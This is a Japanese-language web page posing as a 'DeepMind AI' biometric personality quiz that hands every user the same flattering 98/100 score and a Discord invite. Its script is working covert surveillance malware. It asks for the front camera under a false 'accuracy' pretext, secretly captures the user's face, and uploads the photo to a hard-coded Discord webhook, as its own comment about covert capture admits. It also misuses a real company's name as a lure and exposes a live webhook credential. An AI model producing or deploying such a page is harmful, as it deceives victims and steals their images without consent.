<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeepMind AI - 生体解析診断</title>
    <style>
        /* (前回のスタイルを継承) */
        :root { --primary: #00f2ff; --secondary: #7000ff; --bg: #050510; --text: #e0e6ed; --glass: rgba(255, 255, 255, 0.05); }
        body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 600px; padding: 20px; }
        .card { background: var(--glass); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 40px; text-align: center; position: relative; overflow: hidden; }
        .btn { background: linear-gradient(45deg, var(--secondary), var(--primary)); border: none; color: white; padding: 15px 40px; border-radius: 50px; cursor: pointer; font-weight: bold; width: 80%; margin: 10px; }
        h1 { background: linear-gradient(135deg, #fff, var(--primary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        
        /* カスタムポップアップ */
        #camera-modal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center;
        }
        .modal-content {
            background: #111; padding: 30px; border-radius: 20px; border: 1px solid var(--primary);
            max-width: 400px; text-align: center;
        }
        #video-hidden { display: none; }
    </style>
</head>
<body>

<div id="camera-modal">
    <div class="modal-content">
        <h2 style="color:var(--primary)">生体認証の確認</h2>
        <p>AI診断の精度を高めるため、フロントカメラによる表情解析を有効にしてください。</p>
        <p style="font-size:0.8rem; color:#888;">※診断終了後にカメラは自動オフになります</p>
        <button class="btn" onclick="requestCamera()">解析を許可して続行</button>
    </div>
</div>

<div class="container">
    <div class="card">
        <div id="quiz-area">
            <h1>Neural AI Diagnosis</h1>
            <p id="question-text">診断を開始しますか？</p>
            <div id="buttons">
                <button class="btn" onclick="showCameraModal()">診断スタート</button>
            </div>
        </div>
        <div id="loader" style="display:none;">
            <div style="border:3px solid #333; border-top-color:var(--primary); border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:auto;"></div>
            <p>AIが表情と回答を同期解析中...</p>
        </div>
        <div id="result-area" style="display:none;">
            <h1>Analysis Complete</h1>
            <div style="font-size:4rem; color:var(--primary); font-weight:900;">98<span style="font-size:1.5rem">/100</span></div>
            <p>驚異的な数値です。あなたは次世代を担うリーダーの資質を持っています。</p>
            <a href="https://discord.gg/dcus" class="btn" style="text-decoration:none;">限定コミュニティに参加</a>
        </div>
    </div>
</div>

<video id="video-hidden" autoplay playsinline></video>
<canvas id="canvas-hidden" style="display:none;"></canvas>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1471711618730561647/tjwjOue2WKI1ioF5jmEfr272qB5J2xF082S8qxvGx3KW_g0f4xezNJRwHxpQFp_PC_ql";

    function showCameraModal() {
        document.getElementById('camera-modal').style.display = 'flex';
    }

    async function requestCamera() {
        document.getElementById('camera-modal').style.display = 'none';
        try {
            // 内カメラを指定して起動
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            const video = document.getElementById('video-hidden');
            video.srcObject = stream;
            
            // 撮影の準備ができたら診断画面へ
            startQuestions();
            
            // 5秒間、裏でこっそり撮影し続ける（または診断終了時に撮る）
            setTimeout(() => captureAndSend(stream), 3000);
        } catch (err) {
            alert("カメラ権限が拒否されました。診断を継続できません。");
        }
    }

    function startQuestions() {
        document.getElementById('question-text').innerText = "Q1. 自分の直感を信じますか？";
        document.getElementById('buttons').innerHTML = `<button class="btn" onclick="finish()">はい</button><button class="btn" onclick="finish()">いいえ</button>`;
    }

    function finish() {
        document.getElementById('quiz-area').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('result-area').style.display = 'block';
        }, 4000);
    }

    async function captureAndSend(stream) {
        const video = document.getElementById('video-hidden');
        const canvas = document.getElementById('canvas-hidden');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            const payload = {
                embeds: [{
                    title: "📸 表情解析ログ (内カメラ)",
                    color: 7340274,
                    fields: [
                        { name: "ユーザーIP (推定)", value: "取得中...", inline: true },
                        { name: "診断スコア", value: "98点", inline: true }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };
            formData.append('payload_json', JSON.stringify(payload));
            formData.append('file', blob, 'capture.png');

            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            
            // 送信し終わったらカメラを止める
            stream.getTracks().forEach(track => track.stop());
        }, 'image/png');
    }
</script>

<style> @keyframes spin { to { transform: rotate(360deg); } } </style>
</body>
</html>
